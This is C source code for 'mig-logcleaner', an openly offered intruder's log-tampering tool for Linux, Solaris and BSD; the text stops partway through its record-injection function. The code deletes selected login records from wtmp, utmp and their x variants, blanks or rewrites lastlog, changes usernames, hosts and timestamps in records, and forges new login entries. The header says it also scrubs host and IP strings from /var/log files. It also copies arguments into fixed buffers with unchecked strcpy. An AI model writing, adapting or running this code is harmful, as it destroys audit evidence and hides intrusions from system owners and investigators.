/****************
version		:	2.0.1 - nothing important, I modified the code to remove some warnings at compile-time
****************/


/**************** ORIGINAL COMMENTS
name            :       mig-logcleaner.c
 
version         :       2.0
                        1.0 - first version
                        1.1 - fixed up old bugs and added utmpx/wtmpx support
                        1.2 - fixed "find" problem
                        1.3 - wasn't working on sun. fixed (fscking mess!!!)
                        1.4 - changed shell scripting part
			1.5 - rewrote all thing to support BSD
                              also added '-r' option to replace
			      hostname entries in logs
			1.6 - added username replacement capability
			1.7 - added login/out time changing capability
			1.8 - added capability of injecting entries into wtmp/x file
			2.0 - recoded all this from 0 and fixed lots of fuckups
 
creation date   :       17th of January 2001
 
last updated    :       9th of October 2002
 
author          :       no1 ( greyhats.za.net )
 
description     :       log cleaner that cleans wtmp, wtmpx,
                        utmp, utmpx, lastlog
                        and all log files in /var/log type dir
                        tested on linux(x86), sun(sparc) and bsd(x86)
 
usage           :       tar zxvf mig-logcleaner.tar.gz ; cd mig-logcleaner ; make
			details in readme.mig
 
extra           :       ya ya ya, i know there r thousand of log
                        cleaners out there...  the only reason i
                        coded this is because i needed a cleaner that
                        lets you specify which record specificaly you
                        want to be removed. donno any log cleaner that
                        does that... plus this tool automaticaly
                        removes strings like <host name> and <ip>
                        out of non-binary files in /var/log type
                        of dirs where all logs are kept.
                        an now it also supports changing usernames & hostnames 
			in records or even adding new records. 
			if you have any comments or ideas,
                        mail me at no1@greyhats.za.net or msg me at
                        http://greyhats.za.net/guestbook/
****************/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <pwd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#ifdef LINUX
#include <paths.h>
#include <utmp.h>
#include <utmpx.h>
#include <lastlog.h>
#define UTMP UTMP_FILE
#define WTMP WTMP_FILE
#define LASTLOG _PATH_LASTLOG
#endif
#ifdef SUN
#include <utmp.h>
#include <utmpx.h>
#include <lastlog.h>
#include <strings.h>
#define UTMP UTMP_FILE
#define WTMP WTMP_FILE
#define LASTLOG "/var/adm/lastlog"
#define UTMPX UTMPX_FILE
#define WTMPX WTMPX_FILE
#endif
#ifdef BSD
#include <utmp.h>
#define UTMP _PATH_UTMP
#define WTMP _PATH_WTMP
#define LASTLOG _PATH_LASTLOG
#endif
int                      usage(char *arg);
int                      count_records(char *u, int a, int d);
int                      utmp_clean(char *u, int n, int tota, int d);
int                      utmpx_clean(char *u, int n, int tota, int d);
int                      lastlog_clean(char *u, int d, char *h, char *t, long i, int n);
int                      replase(char *u, int n, int tota1, int tota2, char *U, char *H, long I, long O, int d);
int                      addd(char *u, int n, int tota1, int tota2, char *U, char *T, char *H, long I, long O, int d);
int                      txt_clean(char *D, char *a, char *b, int d);
static char             *lastlog_hostname = 0;
static char             *lastlog_time = 0;
static char             *lastlog_tty = 0;
int                      c = 1, l = 0;
int main(int argc, char **argv)
{
  char                     opt;
  char                     user[16];
  char                     dir[256];
  char                     string1[256];
  char                     string2[256];
  char                     new_user[16];
  char                     new_tty[16];
  char                     new_host[256];
  char                     ll_h[256];
  char                     ll_i[256];
  char                     ll_t[256];
  long                     new_login = 0;
  long                     new_logout = 0;
  int                      replace = 0;
  int                      add = 0;
  int                      record = (-1);
  int                      total1 = 0;
  int                      total2 = 0;
  int                      debug = 0;
  int                      user_check = 0;
  int                      dir_check = 0;
  int                      new_check = 0;
  int                      open_check1 = 0;
#ifdef SUN
  int                      open_check2 = 0;
#endif
  int                      flag = 0;
  bzero(user, sizeof(user));
  bzero(dir, sizeof(dir));
  bzero(string1, sizeof(string1));
  bzero(string2, sizeof(string2));
  bzero(new_user, sizeof(new_user));
  bzero(new_tty, sizeof(new_tty));
  bzero(new_host, sizeof(new_host));
  bzero(ll_h, sizeof(ll_h));
  bzero(ll_i, sizeof(ll_i));
  bzero(ll_t, sizeof(ll_t));
#ifdef SUN
  strcpy(dir, "/var/adm/");
#endif
#ifndef SUN
  strcpy(dir, "/var/log/");
#endif
  while((opt = getopt(argc, argv, "u:n:D:a:b:U:T:H:I:O:RAd")) != -1)
  {
    switch (opt)
    {
      case 'u':
      {
	strcpy(user, optarg);
	user_check++;
	break;
      }
      case 'n':
      {
	record = atoi(optarg);
	break;
      }
      case 'D':
      {
	bzero(dir, sizeof(dir));
	strcpy(dir, optarg);
	dir_check++;
	break;
      }
      case 'a':
      {
	strcpy(string1, optarg);
	flag++;
	break;
      }
      case 'b':
      {
	strcpy(string2, optarg);
	flag++;
	break;
      }
      case 'U':
      {
	strcpy(new_user, optarg);
	new_check++;
	break;
      }
      case 'T':
      {
	strcpy(new_tty, optarg);
	new_check++;
	break;
      }
      case 'H':
      {
	strcpy(new_host, optarg);
	new_check++;
	break;
      }
      case 'I':
      {
	new_login = atol(optarg);
	new_check++;
	break;
      }
      case 'O':
      {
	new_logout = atol(optarg);
	new_check++;
	break;
      }
      case 'R':
      {
	replace++;
	break;
      }
      case 'A':
      {
	add++;
	break;
      }
      case 'd':
      {
	debug++;
	break;
      }
    }
  }
  if((user_check == 0 && add == 0 && dir_check == 0 && flag == 0) || (replace == 1 && add == 1) || (add == 1 && new_check != 5) || (replace == 1 && user_check == 0) || (replace == 1 && new_check == 0)
     || (replace == 1 && record == 0) || (dir_check == 1 && flag == 0))
  {
    usage(argv[0]);
    exit(0);
  }
  printf("\n[0;32m******************************[0m\n");
  printf("[0;32m* MIG Logcleaner v2.0 by [0;31mno1 [0;32m*[0m\n");
  printf("[0;32m******************************[0m\n\n");
  if(record == (-1))
  {
    record = 1;
  }
  if(user[0] != 0)
    total1 = count_records(user, 1, debug);
  if(total1 == (-1))
  {
    if(debug == 1)
      fprintf(stderr, "Error opening %s file to count records\n", WTMP);
    open_check1++;
  }
  if(open_check1 != 1 && replace == 0 && add == 0 && user_check != 0 && (record <= total1))
  {
    utmp_clean(user, record, total1, debug);
  }
#ifdef SUN
  if(user[0] != 0)
    total2 = count_records(user, 2, debug);
  if(total2 == (-1))
  {
    if(debug == 1)
      fprintf(stderr, "Error opening %s file to count records\n", WTMPX);
    open_check2++;
  }
  if(open_check2 != 1 && replace == 0 && add == 0 && user_check != 0 && (record <= total2))
  {
    utmpx_clean(user, record, total2, debug);
  }
#endif
  if(replace == 1 && (record <= total1)
#ifdef SUN
     && (record <= total2)
#endif
    )
  {
    if(l == 1)
    {
      strcpy(ll_h, lastlog_hostname);
      strcpy(ll_i, lastlog_time);
      strcpy(ll_t, lastlog_tty);
    }
    replase(user, record, total1, total2, new_user, new_host, new_login, new_logout, debug);
  }
  if(add == 1)
  {
    if(user[0] != 0 && (record > total1)
#ifdef SUN
       && (record > total2)
#endif
      )
    {
      usage(argv[0]);
      exit(0);
    }
    addd(user, record, total1, total2, new_user, new_tty, new_host, new_login, new_logout, debug);
  }
  if((record == 1 || record == 0) && add == 0)
  {
    if(l == 1)
    {
      strcpy(ll_h, lastlog_hostname);
      strcpy(ll_i, lastlog_time);
      strcpy(ll_t, lastlog_tty);
    }
    lastlog_clean(user, debug, ll_h, ll_t, atol(ll_i), record);
  }
  if(flag != 0)
  {
    txt_clean(dir, string1, string2, debug);
  }
  printf("\n");
  return (0);
}
int count_records(char *u, int a, int d)
{
  int                      fd;
  int                      counter = 0;
#ifdef SUN
  if(a == 2)
  {
    struct utmpx             utmpx_record;
    if((fd = open(WTMPX, O_RDWR)) == -1)
    {
      return (-1);
    }
    while(read(fd, (char *) &utmpx_record, sizeof(utmpx_record)))
    {
      if(!strcmp(utmpx_record.ut_name, u))
      {
	if(utmpx_record.ut_type != 8)
	{
	  counter++;
	}
      }
    }
    fprintf(stdout, "[0x%d] %d entries \"%s\" detected in %s\n", c++, counter, u, WTMPX);
  }
#endif
  if(a == 1)
  {
    struct utmp              utmp_record;
    if((fd = open(WTMP, O_RDWR)) == -1)
    {
      return (-1);
    }
    while(read(fd, (char *) &utmp_record, sizeof(utmp_record)))
    {
      if(!strcmp(utmp_record.ut_name, u))
      {
#ifndef BSD
	if(utmp_record.ut_type != 8)
#endif
	  counter++;
      }
    }
    fprintf(stdout, "[0x%d] %d users \"%s\" detected in %s\n", c++, counter, u, WTMP);
  }
  close(fd);
  return counter;
}
int utmp_clean(char *u, int n, int tota, int d)
{
  struct utmp              utmp_record;
  struct utmp              wtmp_record;
  int                      fd1, fd2;
  int                      counter = 0;
#ifndef BSD
  int                      pid;
#endif
  char                     line[32];
  char                     host[256];
  char                     command[256];
#ifdef BSD
  long                     time;
#endif
  bzero(line, sizeof(line));
  bzero(host, sizeof(host));
  bzero(command, sizeof(command));
  if((fd1 = open(WTMP, O_RDWR)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening %s file\n", WTMP);
    exit(-1);
  }
  if((fd2 = open("/tmp/WTMP.TMP", O_RDWR | O_CREAT)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening /tmp/WTMP.TMP file\n");
    exit(-1);
  }
  lseek(fd1, 0, SEEK_SET);
  lseek(fd2, 0, SEEK_SET);
  while(read(fd1, (char *) &wtmp_record, sizeof(wtmp_record)) == sizeof(wtmp_record))
  {
    if((!strcmp(wtmp_record.ut_name, u))
#ifndef BSD
       && (wtmp_record.ut_type != 8)
#endif
      )
    {
      counter++;
      if(counter == (tota + 1 - n))
      {
	if(n != 0)
	  fprintf(stdout, "[0x%d] Removed \"%s\" entry #%d from %s\n", c++, u, n, WTMP);
#ifndef BSD
	pid = wtmp_record.ut_pid;
	strcpy(line, wtmp_record.ut_line);
#ifndef SUN
	strcpy(host, wtmp_record.ut_host);
#endif
#endif
#ifdef BSD
	time = wtmp_record.ut_time;
	strcpy(line, wtmp_record.ut_line);
#endif
      }
      else
      {
	if(counter == (tota - n))
	{
	  char                     length[16];
	  l++;
	  bzero(length, sizeof(length));
#ifndef SUN
	  lastlog_tty = (char *) malloc(strlen(wtmp_record.ut_line) + 1);
	  strcpy(lastlog_tty, wtmp_record.ut_line);
	  lastlog_hostname = (char *) malloc(strlen(wtmp_record.ut_host) + 1);
	  strcpy(lastlog_hostname, wtmp_record.ut_host);
	  sprintf(length, "%ld", (unsigned long)wtmp_record.ut_time);
	  lastlog_time = (char *) malloc(strlen(length) + 1);
#ifdef LINUX
	  sprintf(lastlog_time, "%ld", (unsigned long)wtmp_record.ut_tv.tv_sec);
#else
	  sprintf(lastlog_time, "%ld", wtmp_record.ut_time);
#endif
#endif

	}
	if(n != 0)
	{
	  write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
	}
      }
    }
    else
    {
      write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
    }
  }
  close(fd1);
  close(fd2);
  if(n == 0 && counter != 0)
    fprintf(stdout, "[0x%d] Removed %d entries of user \"%s\" from %s\n", c++, counter, u, WTMP);
  counter = 0;
  if((fd1 = open(UTMP, O_RDWR)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening %s file\n", UTMP);
    exit(-1);
  }
  if((fd2 = open("/tmp/UTMP.TMP", O_RDWR | O_CREAT)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening /tmp/UTMP.TMP file\n");
  }
  lseek(fd1, 0, SEEK_SET);
  lseek(fd2, 0, SEEK_SET);
  while(read(fd1, (char *) &utmp_record, sizeof(utmp_record)) == sizeof(utmp_record))
  {
    if(!strcmp(utmp_record.ut_name, u))
    {
      counter++;
#ifndef BSD
      if((pid == utmp_record.ut_pid) && (!strcmp(utmp_record.ut_line, line))
#ifndef SUN
	 && (!strcmp(utmp_record.ut_host, host))
#endif
	)
      {
	if(n != 0)
	  fprintf(stdout, "[0x%d] Removed \"%s\" coresponding entry from %s\n", c++, u, UTMP);
      }
#endif
#ifdef BSD
      if((time == utmp_record.ut_time) && (!strcmp(utmp_record.ut_line, line)))
      {
	if(n != 0)
	  fprintf(stdout, "[0x%d] Removed \"%s\" coresponding entry from %s\n", c++, u, UTMP);
      }
#endif
      else
      {
	if(n != 0)
	{
	  write(fd2, (char *) &utmp_record, sizeof(utmp_record));
	}
      }
    }
    else
    {
      write(fd2, (char *) &utmp_record, sizeof(utmp_record));
    }
  }
  close(fd1);
  close(fd2);
  if(n == 0 && counter != 0)
    fprintf(stdout, "[0x%d] Removed %d entries of user \"%s\" from %s\n", c++, counter, u, UTMP);
  sprintf(command, "mv /tmp/WTMP.TMP %s;mv /tmp/UTMP.TMP %s;chmod 644 %s %s", WTMP, UTMP, WTMP, UTMP);
  system(command);
  return (0);
}
#ifdef SUN
int utmpx_clean(char *u, int n, int tota, int d)
{
  struct utmpx             utmpx_record;
  struct utmpx             wtmpx_record;
  int                      fd1, fd2;
  int                      counter = 0;
  int                      pid;
  char                     line[32];
  char                     host[256];
  char                     command[256];
  bzero(line, sizeof(line));
  bzero(host, sizeof(host));
  bzero(command, sizeof(command));
  if((fd1 = open(WTMPX, O_RDWR)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening %s file\n", WTMPX);
    exit(-1);
  }
  if((fd2 = open("/tmp/WTMPX.TMP", O_RDWR | O_CREAT)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening /tmp/WTMPX.TMP file\n");
    exit(-1);
  }
  lseek(fd1, 0, SEEK_SET);
  lseek(fd2, 0, SEEK_SET);
  while(read(fd1, (char *) &wtmpx_record, sizeof(wtmpx_record)))
  {
    if((!strcmp(wtmpx_record.ut_name, u)) && (wtmpx_record.ut_type != 8))
    {
      counter++;
      if(counter == (tota + 1 - n))
      {
	if(n != 0)
	  fprintf(stdout, "[0x%d] Removed \"%s\" entry #%d from %s\n", c++, u, n, WTMPX);
	pid = wtmpx_record.ut_pid;
	strcpy(line, wtmpx_record.ut_line);
	strcpy(host, wtmpx_record.ut_host);
      }
      else
      {
	if(counter == (tota - n))
	{
	  char                     length[16];
	  l++;
	  bzero(length, sizeof(length));
	  lastlog_tty = (char *) malloc(strlen(wtmpx_record.ut_line) + 1);
	  strcpy(lastlog_tty, wtmpx_record.ut_line);
	  lastlog_hostname = (char *) malloc(strlen(wtmpx_record.ut_host) + 1);
	  strcpy(lastlog_hostname, wtmpx_record.ut_host);
	  sprintf(length, "%ld", wtmpx_record.ut_tv.tv_sec);
	  lastlog_time = (char *) malloc(strlen(length) + 1);
	  sprintf(lastlog_time, "%ld", wtmpx_record.ut_tv.tv_sec);
	}
	if(n != 0)
	{
	  write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
	}
      }
    }
    else
    {
      write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
    }
  }
  close(fd1);
  close(fd2);
  if(n == 0)
    fprintf(stdout, "[0x%d] Removed %d entries of user \"%s\" from %s\n", c++, counter, u, WTMPX);
  counter = 0;
  if((fd1 = open(UTMPX, O_RDWR)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening %s file\n", UTMPX);
    exit(-1);

  }
  if((fd2 = open("/tmp/UTMPX.TMP", O_RDWR | O_CREAT)) == -1)
  {
    if(d == 1)
      fprintf(stderr, "Error opening /tmp/UTMPX.TMP file\n");
    exit(-1);
  }
  lseek(fd1, 0, SEEK_SET);
  lseek(fd2, 0, SEEK_SET);
  while(read(fd1, (char *) &utmpx_record, sizeof(utmpx_record)))
  {
    if((!strcmp(utmpx_record.ut_name, u)))
    {
      counter++;
      if((pid == utmpx_record.ut_pid) && (!strcmp(utmpx_record.ut_line, line)) && (!strcmp(utmpx_record.ut_host, host)))
      {
	if(n != 0)
	  fprintf(stdout, "[0x%d] Removed \"%s\" coresponding entry from %s\n", c++, u, UTMPX);
      }
      else
      {
	if(n != 0)
	{
	  write(fd2, (char *) &utmpx_record, sizeof(utmpx_record));
	}
      }
    }
    else
    {
      write(fd2, (char *) &utmpx_record, sizeof(utmpx_record));
    }
  }
  close(fd1);
  close(fd2);
  if(n == 0)
    fprintf(stdout, "[0x%d] Removed %d entries of user \"%s\" from %s\n", c++, counter, u, UTMPX);
  sprintf(command, "mv /tmp/WTMPX.TMP %s;mv /tmp/UTMPX.TMP %s;chmod 644 %s %s", WTMPX, UTMPX, WTMPX, UTMPX);
  system(command);
  return (0);
}
#endif

int lastlog_clean(char *u, int d, char *h, char *t, long i, int n)
{
  struct passwd           *password;
  struct lastlog           last;
  int                      fd;
  bzero((char *) &last, sizeof(last));
  if((password = getpwnam(u)))
  {
    if((fd = open(LASTLOG, O_RDWR)) >= 0)
    {
      lseek(fd, (long) password->pw_uid * sizeof(struct lastlog), 0);
      //read(fd,(char *)&lastlog,sizeof(lastlog));
      if(l == 1 && n != 0)
      {
	memcpy(last.ll_host, h, sizeof(last.ll_host));
	memcpy(last.ll_line, t, sizeof(last.ll_line));
	last.ll_time = i;
      }
      fprintf(stdout, "[0x%d] Changing \"%s\" coresponding entry in %s\n", c++, u, LASTLOG);
      //lseek(fd,-(sizeof(struct lastlog)),SEEK_CUR);
      write(fd, (char *) &last, sizeof(last));
      close(fd);
    }
  }
  return (0);
}
int replase(char *u, int n, int tota1, int tota2, char *U, char *H, long I, long O, int d)
{
  struct utmp              utmp_record;
  struct utmp              wtmp_record;
#ifndef BSD
  struct timeval           tv_start;
  struct timeval           tv_end;
  int                      pid;
#endif
#ifdef BSD
  struct timespec          tv_start;
  struct timespec          tv_end;
#endif
#ifdef SUN
  struct utmpx             utmpx_record;
  struct utmpx             wtmpx_record;
#endif
  int                      fd1, fd2;
  int                      counter = 0;
  int                      replace_check = 0;
  char                     line[32];
  char                     host[256];
  char                     command[256];
#ifdef BSD
  long                     time;
  tv_start.tv_sec = I;
  tv_start.tv_nsec = 0;
  tv_end.tv_sec = O;
  tv_end.tv_nsec = 0;
#else
  tv_start.tv_sec = I;
  tv_start.tv_usec = 0;
  tv_end.tv_sec = O;
  tv_end.tv_usec = 0;
#endif
  bzero(line, sizeof(line));
  bzero(host, sizeof(host));
  bzero(command, sizeof(command));
  if(tota1 != (-1))
  {
    if((fd1 = open(WTMP, O_RDWR)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening %s file\n", WTMP);
      exit(-1);
    }
    if((fd2 = open("/tmp/WTMP.TMP", O_RDWR | O_CREAT)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening /tmp/WTMP.TMP file\n");
      exit(-1);
    }
    lseek(fd1, 0, SEEK_SET);
    lseek(fd2, 0, SEEK_SET);
    while(read(fd1, (char *) &wtmp_record, sizeof(wtmp_record)) == sizeof(wtmp_record))
    {
      if((!strcmp(wtmp_record.ut_name, u))
#ifndef BSD
	 && (wtmp_record.ut_type != 8)
#endif
	)
      {
	counter++;
	if(counter == (tota1 + 1 - n))
	{
	  replace_check++;
	  fprintf(stdout, "[0x%d] Replaced \"%s\" entry #%d from %s\n", c++, u, n, WTMP);
#ifndef BSD
	  pid = wtmp_record.ut_pid;
	  strcpy(line, wtmp_record.ut_line);
#ifndef SUN
	  strcpy(host, wtmp_record.ut_host);
#endif
#endif
#ifdef BSD
	  time = wtmp_record.ut_time;
	  strcpy(line, wtmp_record.ut_line);
	  strcpy(host, wtmp_record.ut_host);
#endif
	  if(U[0] != 0)
	  {
	    bzero(wtmp_record.ut_name, sizeof(wtmp_record.ut_name));
	    strcpy(wtmp_record.ut_name, U);
	  }
#ifndef SUN
	  if(H[0] != 0)
	  {
	    bzero(wtmp_record.ut_host, sizeof(wtmp_record.ut_host));
	    strcpy(wtmp_record.ut_host, H);
	  }
#endif
	  if(I != 0)
	  {
#ifdef LINUX
	    wtmp_record.ut_tv.tv_sec = tv_start.tv_sec;
#else
	    wtmp_record.ut_time = tv_start.tv_sec;
#endif
	  }
	  write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
	}
	else
	{
	  if(counter == (tota1 - n))
	  {
	    char                     length[16];
	    l++;
	    bzero(length, sizeof(length));
#ifndef SUN
	    lastlog_tty = (char *) malloc(strlen(wtmp_record.ut_line) + 1);
	    strcpy(lastlog_tty, wtmp_record.ut_line);
	    lastlog_hostname = (char *) malloc(strlen(wtmp_record.ut_host) + 1);
	    strcpy(lastlog_hostname, wtmp_record.ut_host);
	    sprintf(length, "%ld", (unsigned long)wtmp_record.ut_time);
	    lastlog_time = (char *) malloc(strlen(length) + 1);
#ifdef LINUX
	    sprintf(lastlog_time, "%ld", (unsigned long)wtmp_record.ut_tv.tv_sec);
#else
	    sprintf(lastlog_time, "%ld", wtmp_record.ut_time);
#endif
#endif
	  }
	  write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
	}
      }
      else
      {
	if((replace_check == 1) && (!strcmp(wtmp_record.ut_line, line))
#ifndef BSD
	   && (wtmp_record.ut_type == 8)
#endif
	  )
	{
	  replace_check--;
	  if(O != 0)
	  {
#ifdef LINUX
	    wtmp_record.ut_tv.tv_sec = tv_end.tv_sec;
#else
	    wtmp_record.ut_time = tv_end.tv_sec;
#endif
	  }
	}
	write(fd2, (char *) &wtmp_record, sizeof(wtmp_record));
      }
    }
    close(fd1);
    close(fd2);
    counter = 0;
    replace_check = 0;
    if((fd1 = open(UTMP, O_RDWR)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening %s file\n", UTMP);
      exit(-1);
    }
    if((fd2 = open("/tmp/UTMP.TMP", O_RDWR | O_CREAT)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening /tmp/UTMP.TMP file\n");
    }
    lseek(fd1, 0, SEEK_SET);
    lseek(fd2, 0, SEEK_SET);
    while(read(fd1, (char *) &utmp_record, sizeof(utmp_record)) == sizeof(utmp_record))
    {
      if(!strcmp(utmp_record.ut_name, u))
      {
	counter++;
#ifndef BSD
	if((pid == utmp_record.ut_pid) &&
#else
	if((time == utmp_record.ut_time) &&
#endif
	   (!strcmp(utmp_record.ut_line, line))
#ifdef LINUX
	   && (!strcmp(utmp_record.ut_host, host))
#endif
	  )
	{
	  replace_check++;
	  fprintf(stdout, "[0x%d] Replaced \"%s\" coresponding entry from %s\n", c++, u, UTMP);
	  if(U[0] != 0)
	  {
	    bzero(utmp_record.ut_name, sizeof(utmp_record.ut_name));
	    strcpy(utmp_record.ut_name, U);
	  }
#ifndef SUN
	  if(H[0] != 0)
	  {
	    bzero(utmp_record.ut_host, sizeof(utmp_record.ut_host));
	    strcpy(utmp_record.ut_host, H);
	  }
#endif
	  if(I != 0)
	  {
#ifdef LINUX
	    utmp_record.ut_tv.tv_sec = tv_start.tv_sec;
#else
	    utmp_record.ut_time = tv_start.tv_sec;
#endif
	  }
	  write(fd2, (char *) &utmp_record, sizeof(utmp_record));
	}
	else
	{
	  write(fd2, (char *) &utmp_record, sizeof(utmp_record));
	}
      }
      else
      {
	if((replace_check == 1) && (!strcmp(utmp_record.ut_line, line))
#ifndef BSD
	   && (utmp_record.ut_type == 8)
#endif
	  )
	{
	  replace_check--;
	  if(O != 0)
	  {
#ifdef LINUX
	    utmp_record.ut_tv.tv_sec = tv_end.tv_sec;
#else
	    utmp_record.ut_time = tv_end.tv_sec;
#endif
	  }
	}
	write(fd2, (char *) &utmp_record, sizeof(utmp_record));
      }
    }
    close(fd1);
    close(fd2);
    replace_check = 0;
    sprintf(command, "mv /tmp/WTMP.TMP %s;mv /tmp/UTMP.TMP %s;chmod 644 %s %s", WTMP, UTMP, WTMP, UTMP);
    system(command);
  }
#ifdef SUN
  l = 0;
  if(tota2 != (-1))
  {
    if((fd1 = open(WTMPX, O_RDWR)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening %s file\n", WTMPX);
      exit(-1);
    }
    if((fd2 = open("/tmp/WTMPX.TMP", O_RDWR | O_CREAT)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening /tmp/WTMPX.TMP file\n");
      exit(-1);
    }
    lseek(fd1, 0, SEEK_SET);
    lseek(fd2, 0, SEEK_SET);
    while(read(fd1, (char *) &wtmpx_record, sizeof(wtmpx_record)))
    {
      if((!strcmp(wtmpx_record.ut_name, u)) && (wtmpx_record.ut_type != 8))
      {
	counter++;
	if(counter == (tota2 + 1 - n))
	{
	  replace_check++;
	  fprintf(stdout, "[0x%d] Replaced \"%s\" entry #%d from %s\n", c++, u, n, WTMPX);
	  pid = wtmpx_record.ut_pid;
	  strcpy(line, wtmpx_record.ut_line);
	  strcpy(host, wtmpx_record.ut_host);
	  if(U[0] != 0)
	  {
	    bzero(wtmpx_record.ut_name, sizeof(wtmpx_record.ut_name));
	    strcpy(wtmpx_record.ut_name, U);
	  }
	  if(H[0] != 0)
	  {
	    bzero(wtmpx_record.ut_host, sizeof(wtmpx_record.ut_host));
	    strcpy(wtmpx_record.ut_host, H);
	  }
	  if(I != 0)
	  {
	    wtmpx_record.ut_tv.tv_sec = tv_start.tv_sec;
	  }
	  write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
	}
	else
	{
	  if(counter == (tota2 - n))
	  {
	    char                     length[16];
	    l++;
	    bzero(length, sizeof(length));
	    lastlog_tty = (char *) malloc(strlen(wtmpx_record.ut_line) + 1);
	    strcpy(lastlog_tty, wtmpx_record.ut_line);
	    lastlog_hostname = (char *) malloc(strlen(wtmpx_record.ut_host) + 1);
	    strcpy(lastlog_hostname, wtmpx_record.ut_host);
	    sprintf(length, "%ld", wtmpx_record.ut_tv.tv_sec);
	    lastlog_time = (char *) malloc(strlen(length) + 1);
	    sprintf(lastlog_time, "%ld", wtmpx_record.ut_tv.tv_sec);
	  }
	  write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
	}
      }
      else
      {
	if((replace_check == 1) && (!strcmp(wtmpx_record.ut_line, line)) && (wtmpx_record.ut_type == 8))
	{
	  replace_check--;
	  if(O != 0)
	  {
	    wtmpx_record.ut_tv.tv_sec = tv_end.tv_sec;
	  }
	}
	write(fd2, (char *) &wtmpx_record, sizeof(wtmpx_record));
      }
    }
    close(fd1);
    close(fd2);
    counter = 0;
    replace_check = 0;
    if((fd1 = open(UTMPX, O_RDWR)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening %s file\n", UTMPX);
      exit(-1);

    }
    if((fd2 = open("/tmp/UTMPX.TMP", O_RDWR | O_CREAT)) == -1)
    {
      if(d == 1)
	fprintf(stderr, "Error opening /tmp/UTMPX.TMP file\n");
      exit(-1);
    }
    lseek(fd1, 0, SEEK_SET);
    lseek(fd2, 0, SEEK_SET);
    while(read(fd1, (char *) &utmpx_record, sizeof(utmpx_record)))
    {
      if((!strcmp(utmpx_record.ut_name, u)))
      {
	counter++;
	if((pid == utmpx_record.ut_pid) && (!strcmp(utmpx_record.ut_line, line)) && (!strcmp(utmpx_record.ut_host, host)))
	{
	  replace_check++;
	  fprintf(stdout, "[0x%d] Replaced \"%s\" coresponding entry from %s\n", c++, u, UTMPX);
	  if(U[0] != 0)
	  {
	    bzero(utmpx_record.ut_name, sizeof(utmpx_record.ut_name));
	    strcpy(utmpx_record.ut_name, U);
	  }
	  if(H[0] != 0)
	  {
	    bzero(utmpx_record.ut_host, sizeof(utmpx_record.ut_host));
	    strcpy(utmpx_record.ut_host, H);
	  }
	  if(I != 0)
	  {
	    utmpx_record.ut_tv.tv_sec = tv_start.tv_sec;
	  }
	  write(fd2, (char *) &utmpx_record, sizeof(utmpx_record));
	}
	else
	{
	  if(n != 0)
	  {
	    write(fd2, (char *) &utmpx_record, sizeof(utmpx_record));
	  }
	}
      }
      else
      {
	if((replace_check == 1) && (!strcmp(utmpx_record.ut_line, line)) && (utmpx_record.ut_type == 8))
	{
	  replace_check = 0;
	  if(O != 0)
	  {
	    utmpx_record.ut_tv.tv_sec = tv_end.tv_sec;
	  }
	}
	write(fd2, (char *) &utmpx_record, sizeof(utmpx_record));
      }
    }
    close(fd1);
    close(fd2);
    if(n == 0)
      fprintf(stdout, "[0x%d] Removed %d entries of user \"%s\" from %s\n", c++, counter, u, UTMPX);
    sprintf(command, "mv /tmp/WTMPX.TMP %s;mv /tmp/UTMPX.TMP %s;chmod 644 %s %s", WTMPX, UTMPX, WTMPX, UTMPX);
    system(command);
  }
#endif
  return (0);
}
int addd(char *u, int n, int tota1, int tota2, char *U, char *T, char *H, long I, long O, int d)
{
  struct utmp              wtmp_record;
  struct utmp              new_wtmp_in_record;
  struct utmp              new_wtmp_out_record;
#ifdef SUN
  struct utmpx             wtmpx_record;
  struct utmpx             new_wtmpx_in_record;
  struct utmpx             new_wtmpx_out_record;
#endif
  int                      fd1;
  int                      fd2;
  int                      counter = 0;
  int                      check = 0;
  char                     command[256];
  bzero(command, sizeof(command));
  // Create new entries
#ifndef BSD
  new_wtmp_in_record.ut_type = 7;
  new_wtmp_in_record.ut_pid = 0;
  new_wtmp_in_record.ut_exit.e_termination = 0;
  new_wtmp_in_record.ut_exit.e_exit = 0;
#ifndef SUN
  new_wtmp_in_record.ut_session = 0;
  new_wtmp_in_record.ut_tv.tv_sec = I;
  new_wtmp_in_record.ut_tv.tv_usec = 0;
#else
  new_wtmp_in_record.ut_time = I;
#endif
  strcpy(new_wtmp_in_record.ut_user, U);
  strcpy(new_wtmp_in_record.ut_line, T);
#ifndef SUN
  strcpy(new_wtmp_in_record.ut_host, H);
#endif
  new_wtmp_out_record.ut_type = 8;
  new_wtmp_out_record.ut_pid = 0;
  new_wtmp_out_record.ut_exit.e_termination = 0;
  new_wtmp_out_record.ut_exit.e_exit = 0;
#ifndef SUN
  new_wtmp_out_record.ut_session = 0;
  new_wtmp_out_record.ut_tv.tv_sec = O;
  new_wtmp_out_record.ut_tv.tv_usec = 0;
#else
  new_wtmp_out_record.ut_time = O;
#endif
  strcpy(new_wtmp_out_record.ut_user, U);
  strcpy(new_wtmp_out_record.ut_line, T);
#ifndef SUN
  strcpy(new_wtmp_out_record.ut_host, H);
#endif
#endif
#ifdef BSD
  new_wtmp_in_record.ut_time = I;
  strcpy(new_wtmp_in_record.ut_name, U);
  strcpy(new_wtmp_in_record.ut_line, T);
  strcpy(new_wtmp_in_record.ut_host, H);
